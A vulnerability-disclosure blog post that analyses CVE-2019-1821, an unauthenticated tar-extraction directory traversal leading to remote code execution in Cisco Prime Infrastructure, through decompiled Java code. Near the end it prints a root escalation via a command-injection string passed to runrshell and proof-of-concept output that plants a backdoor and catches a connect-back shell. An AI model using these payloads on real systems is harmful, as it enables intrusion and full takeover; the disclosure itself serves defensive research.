---
layout: post
title: "Panic! at the Cisco :: Unauthenticated Remote Code Execution in Cisco Prime Infrastructure"
date: 2019-05-17 10:00:00 -0500
categories: blog
---

![Cisco Prime Infrastructure](/assets/images/panic-at-the-cisco/cisco.png "Cisco Prime Infrastructure") 

Not all directory traversals are the same. The impact can range depending on what the traversal is used for and how much user interaction is needed. As you will find out, this simple bug class can be hard to spot in code and can have a devastating impact.
<!--more-->

Cisco patched this vulnerability as [CVE-2019-1821](/advisories/src-2019-0034) in Prime Infrastructure, however I am uncertain of the patch details and since I cannot test it (I don't have access to a Cisco license), I decided to share the details here in the hope that someone else can verify its robustness.

TL;DR; *In this post, I discuss the discovery and exploitation of [CVE-2019-1821](/advisories/src-2019-0034) which is an unauthenticated server side remote code execution vulnerability, just the type of bug we will cover in our training class [Full Stack Web Attack](/training/). ~~The only interaction that is required is that an admin opens a link to trigger the XSS.~~*

## Introduction

The Cisco [website](https://www.cisco.com/c/en/us/products/cloud-systems-management/prime-infrastructure/index.html) explains what Prime Infrastructure (PI) is:

> Cisco Prime Infrastructure has what you need to simplify and automate management tasks while taking advantage of the intelligence of your Cisco networks. Product features and capabilities help you ...consolidate products, manage the network for mobile collaboration, simplify WAN management...

Honestly, I still couldn't understand what the intended use case is, so I decided to go to [Wikipedia](https://en.wikipedia.org/wiki/Cisco_Prime).

> Cisco Prime is a network management software suite consisting of different software applications by Cisco Systems. Most applications are geared towards either Enterprise or Service Provider networks.

Thanks to Wikipedia, it was starting to make sense and it looks like I am not the only one [confused](https://www.reddit.com/r/networking/comments/34w491/what_does_cisco_prime_do_exactly/) to what this product actually does. Needless to say, that doesn’t always matter when performing security research.

## The Target

At the time, I tested this bug on the **PI-APL-3.4.0.0.348-1-K9.iso (d513031f481042092d14b77cd03cbe75)** installer with the patch **PI_3_4_1-1.0.27.ubf (56a2acbcf31ad7c238241f701897fcb1)** applied. That patch was supposed to prevent [Pedro](https://twitter.com/pedrib1337)'s bug, [CVE-2018-15379](https://github.com/pedrib/PoC/blob/master/advisories/cisco-prime-infrastructure.txt#L27). However, as we will see, a single CVE was given to two different vulnerabilities and only one of them was patched.

```
piconsole/admin# show version

Cisco Prime Infrastructure
********************************************************
Version : 3.4.0
Build : 3.4.0.0.348
Critical Fixes:
        PI 3.4.1 Maintenance Release ( 1.0.0 )
```

After performing a default install, I needed to setup high availability to reach the target code. This is standard practice when setting up a Cisco Prime Infrastructure install as stated in the [documentation](https://www.cisco.com/c/en/us/td/docs/net_mgmt/prime/infrastructure/3-4/admin/guide/bk_CiscoPrimeInfastructure_3_4_AdminGuide/bk_CiscoPrimeInfastructure_3_4_AdminGuide_chapter_01010.html) that I followed. It looks like a complicated process but essentially it boiled down to deploying two different PI installs and configuring one to be a primary HA server and other to be a secondary HA server.

![High level view of High Availability](/assets/images/panic-at-the-cisco/ha.jpg "High level view of High Availability") 

After using gigs of ram and way too much diskspace in my lab, the outcome looked like this:

![A correctly configured High Availability environment](/assets/images/panic-at-the-cisco/healthy-ha.png "A correctly configured High Availability environment") 

Additionally, I had a friend confirm the existence of this bug on version 3.5 before reporting it directly to Cisco.

## The Vulnerability

Inside of the **/opt/CSCOlumos/healthmonitor/webapps/ROOT/WEB-INF/web.xml** file we find the following entry:

```xml
    <!-- Fileupload Servlet -->
    <servlet>
        <servlet-name>UploadServlet</servlet-name>
        <display-name>UploadServlet</display-name>
        <servlet-class>
            com.cisco.common.ha.fileutil.UploadServlet
        </servlet-class>
    </servlet>

    <servlet-mapping>
        <servlet-name>UploadServlet</servlet-name>
        <url-pattern>/servlet/UploadServlet</url-pattern>
    </servlet-mapping>
```

This servlet is part of the **Health Monitor** application and requires a high availability server to be configured and connected. See [target](#target).
Now, inside of the **/opt/CSCOlumos/lib/pf/rfm-3.4.0.403.24.jar** file, we can find the corresponding code for the UploadServlet class:

```java
public class UploadServlet
  extends HttpServlet
{
  private static final String FILE_PREFIX = "upload_";
  private static final int ONE_K = 1024;
  private static final int HTTP_STATUS_500 = 500;
  private static final int HTTP_STATUS_200 = 200;
  private boolean debugTar = false;
  
  public void init() {}
  
  public void doPost(HttpServletRequest request, HttpServletResponse response)
    throws IOException, ServletException
  {
    String fileName = null;
    
    long fileSize = 0L;
    
    boolean result = false;
    response.setContentType("text/html");
    String destDir = request.getHeader("Destination-Dir");                              // 1
    String archiveOrigin = request.getHeader("Primary-IP");                             // 2
    String fileCount = request.getHeader("Filecount");                                  // 3
    fileName = request.getHeader("Filename");                                           // 4
    String sz = request.getHeader("Filesize");                                          // 5
    if (sz != null) {
      fileSize = Long.parseLong(sz);
    }
    String compressed = request.getHeader("Compressed-Archive");                        // 6
    boolean archiveIsCompressed;
    boolean archiveIsCompressed;
    if (compressed.equals("true")) {
      archiveIsCompressed = true;
    } else {
      archiveIsCompressed = false;
    }
    AesLogImpl.getInstance().info(128, new Object[] { "Received archive=" + fileName, " size=" + fileSize + " from " + archiveOrigin + " containing " + fileCount + " files to be extracted to: " + destDir });
    
    ServletFileUpload upload = new ServletFileUpload();
    
    upload.setSizeMax(-1L);
    PropertyManager pmanager = PropertyManager.getInstance(archiveOrigin);              // 7
    String outDir = pmanager.getOutputDirectory();                                      // 8
    
    File fOutdir = new File(outDir);
    if (!fOutdir.exists()) {
      AesLogImpl.getInstance().info(128, new Object[] { "UploadServlet: Output directory for archives " + outDir + " does not exist. Continuing..." });
    }
    String debugset = pmanager.getProperty("DEBUG");
    if ((debugset != null) && (debugset.equals("true")))
    {
      this.debugTar = true;
      AesLogImpl.getInstance().info(128, new Object[] { "UploadServlet: Debug setting is specified" });
    }
    try
    {
      FileItemIterator iter = upload.getItemIterator(request);
      while (iter.hasNext())
      {
        FileItemStream item = iter.next();
        String name = item.getFieldName();
        InputStream stream = item.openStream();                                         // 9
        if (item.isFormField())
        {
          AesLogImpl.getInstance().error(128, new Object[] { "Form field input stream with name " + name + " detected. Abort processing" });
          
          response.sendError(500, "Servlet does not handle FormField uploads."); return;
        }
                                                                                        // 10
        result = processFileUploadStream(item, stream, destDir, archiveOrigin, archiveIsCompressed, fileName, fileSize, outDir);
        stream.close();
      }
    }
```

At *[1]*, *[2]*, *[3]*, *[4]*, *[5]* and *[6]*, the code gets 6 input parameters from an attacker controlled request. They are the **destDir**, **archiveOrigin**, **fileCount**, **fileName**, **fileSize** (which is a long value) and **compressed** (which is a boolean).

Then at *[7]* we need to supply a correct **Primary-IP** so that we get a valid outDir at *[8]*. Then at *[9]* the code actually gets stream input from a file upload and then at *[10]* the code calls **processFileUploadStream** with the first 7 of the 8 parameters to the method.

```java
  private boolean processFileUploadStream(FileItemStream item, InputStream istream, String destDir, String archiveOrigin, boolean archiveIsCompressed, String archiveName, long sizeInBytes, String outputDir)
    throws IOException
  {
    boolean result = false;
    try
    {
      FileExtractor extractor = new FileExtractor();                                                    // 11
      AesLogImpl.getInstance().info(128, new Object[] { "processFileUploadStream: Start extracting archive = " + archiveName + " size= " + sizeInBytes });
      
      extractor.setDebug(this.debugTar);
      
      result = extractor.extractArchive(istream, destDir, archiveOrigin, archiveIsCompressed);          // 12
```

Then the code at *[11]* creates a new **FileExtractor** and then at *[12]* the code calls **extractArchive** with attacker controlled paramaters **istream**, **destDir**, **archiveOrigin** and **archiveIsCompressed**.

```java
public class FileExtractor
{

  ...

  public boolean extractArchive(InputStream ifstream, String destDirToken, String sourceIPAddr, boolean compressed)
  {
    if (ifstream == null) {
      throw new IllegalArgumentException("Tar input stream not specified");
    }
    String destDir = getDestinationDirectory(sourceIPAddr, destDirToken);                               // 13
    if ((destDirToken == null) || (destDir == null)) {
      throw new IllegalArgumentException("Destination directory token " + destDirToken + " or destination dir=" + destDir + " for extraction of tar file not found");
    }
    FileArchiver archiver = new FileArchiver();
    boolean result = archiver.extractArchive(compressed, null, ifstream, destDir);                      // 14
    
    return result;
  }
```

At *[13]* the code calls **getDestinationDirectory** with our controlled **sourceIPAddr** and **destDirToken**. The **destDirToken** needs to be a valid directory token, so I used the **tftpRoot** string. Below is an abtraction taken from the **HighAvailabilityServerInstanceConfig** class.

```java
    if (name.equalsIgnoreCase("tftpRoot")) {
      return getTftpRoot();
    }
```

At this point, we reach *[14]* which calls **extractArchive** with our parameters **compressed**, **ifstream** and **destDir**.

```java
public class FileArchiver
{

  ...

  public boolean extractArchive(boolean compress, String archveName, InputStream istream, String userDir)
  {
    this.archiveName = archveName;
    this.compressed = compress;
    File destDir = new File(userDir);
    if (istream != null) {
      AesLogImpl.getInstance().trace1(128, "Extract archive from stream  to directory " + userDir);
    } else {
      AesLogImpl.getInstance().trace1(128, "Extract archive " + this.archiveName + " to directory " + userDir);
    }
    if ((!destDir.exists()) && 
      (!destDir.mkdirs()))
    {
      destDir = null;
      AesLogImpl.getInstance().error1(128, "Error while creating destination dir=" + userDir + " Giving up extraction of archive " + this.archiveName);
      
      return false;
    }
    result = false;
    if (destDir != null) {
      try
      {
        setupReadArchive(istream);                                  // 15
        this.archive.extractContents(destDir);                      // 17
        return true;
      }
```

The code first calls **setupReadArchive** at *[15]*. This is important, because we set the **archive** variable to be an instance of the **TarArchive** class at *[16]* in the below code.

```java
  private boolean setupReadArchive(InputStream istream)
    throws IOException
  {
    if ((this.archiveName != null) && (istream == null)) {
      try
      {
        this.inStream = new FileInputStream(this.archiveName);
      }
      catch (IOException ex)
      {
        this.inStream = null;
        return false;
      }
    } else {
      this.inStream = istream;
    }
    if (this.inStream != null) {
      if (this.compressed)
      {
        try
        {
          this.inStream = new GZIPInputStream(this.inStream);
        }
        catch (IOException ex)
        {
          this.inStream = null;
        }
        if (this.inStream != null) {
          this.archive = new TarArchive(this.inStream, 10240);              // 16
        }
      }
      else
      {
        this.archive = new TarArchive(this.inStream, 10240);
      }
    }
    if (this.archive != null) {
      this.archive.setDebug(this.debug);
    }
    return this.archive != null;
  }
```

Then at *[17]* the code calls **extractContents** on the **TarArchive** class.

```java
  extractContents( File destDir )
    throws IOException, InvalidHeaderException
    {
    for ( ; ; )
      {
      TarEntry entry = this.tarIn.getNextEntry();

      if ( entry == null )
        {
        if ( this.debug )
          {
          System.err.println( "READ EOF RECORD" );
          }
        break;
        }

      this.extractEntry( destDir, entry );                      // 18
      }
    }
```

At *[18]* the entry is extracted and finally we can see the line responsible for blindly extracting tar archives without checking for directory traversals.

```java
        try {
          boolean asciiTrans = false;

          FileOutputStream out =
            new FileOutputStream( destFile );                   // 19

          ...

          for ( ; ; )
            {
            int numRead = this.tarIn.read( rdbuf );

            if ( numRead == -1 )
              break;
            
            if ( asciiTrans )
              {
              for ( int off = 0, b = 0 ; b < numRead ; ++b )
                {
                if ( rdbuf[ b ] == 10 )
                  {
                  String s = new String
                    ( rdbuf, off, (b - off) );

                  outw.println( s );

                  off = b + 1;
                  }
                }
              }
            else
              {
              out.write( rdbuf, 0, numRead );                  // 20
              }
            }
```

At *[19]* the file is created and then finally at *[20]* the contents of the file is writen to disk. It's interesting to note that the vulnerable class is actually third party code written by Timothy Gerard Endres at ICE Engineering. It's even more interesting that other projects such as [radare](https://github.com/radare/radare2-installer/blob/master/src/com/ice/tar/TarArchive.java) also uses this vulnerable code!
The impact of this vulnerability is that it can allow an unauthenticated attacker to achieve remote code execution as the *prime* user.

## Bonus

Since Cisco didn't patch [CVE-2018-15379](https://github.com/pedrib/PoC/blob/master/advisories/cisco-prime-infrastructure.txt#L56) completely, I was able to escalate my access to root:

```
python -c 'import pty; pty.spawn("/bin/bash")'
[prime@piconsole CSCOlumos]$ /opt/CSCOlumos/bin/runrshell '" && /bin/sh #'
/opt/CSCOlumos/bin/runrshell '" && /bin/sh #'
sh-4.1# /usr/bin/id
/usr/bin/id
uid=0(root) gid=0(root) groups=0(root),110(gadmin),201(xmpdba) context=system_u:system_r:unconfined_java_t:s0
```

But wait, there is more! Another remote code execution vulnerability also exists in the source code of [TarArchive.java](https://github.com/radare/radare2-installer/blob/master/src/com/ice/tar/TarArchive.java#L522). Can you spot it? :->

## Proof of Concept

```
saturn:~ mr_me$ ./poc.py 
(+) usage: ./poc.py <target> <connectback:port>
(+) eg: ./poc.py 192.168.100.123 192.168.100.2:4444

saturn:~ mr_me$ ./poc.py 192.168.100.123 192.168.100.2:4444
(+) planted backdoor!
(+) starting handler on port 4444
(+) connection from 192.168.100.123
(+) pop thy shell!
python -c 'import pty; pty.spawn("/bin/bash")'
[prime@piconsole CSCOlumos]$ /opt/CSCOlumos/bin/runrshell '" && /bin/sh #'
/opt/CSCOlumos/bin/runrshell '" && /bin/sh #'
sh-4.1# /usr/bin/id
/usr/bin/id
uid=0(root) gid=0(root) groups=0(root),110(gadmin),201(xmpdba) context=system_u:system_r:unconfined_java_t:s0
```

You can download the full exploit [here](/pocs/src-2019-0034.py.txt).

## Thanks

A special shoutout goes to Omar Santos and Ron Taylor of Cisco PSIRT for communicating very effectively during the process of reporting the vulnerabilities.

## Conclusion

This vulnerability survived multiple code audits by security researchers and I believe that's because it was triggered in a component that was only reachable after configuring high availability. Sometimes it takes extra effort from the security researchers point of view to configure lab environments correctly.

Finally, if you would like to learn how to perform in depth attacks like these then feel free to [sign up](https://fswa.eventbrite.com/) to my training course [Full Stack Web Attack](/training/) in early October this year.

## References

- [https://raw.githubusercontent.com/pedrib/PoC/master/advisories/cisco-prime-infrastructure.txt](https://raw.githubusercontent.com/pedrib/PoC/master/advisories/cisco-prime-infrastructure.txt)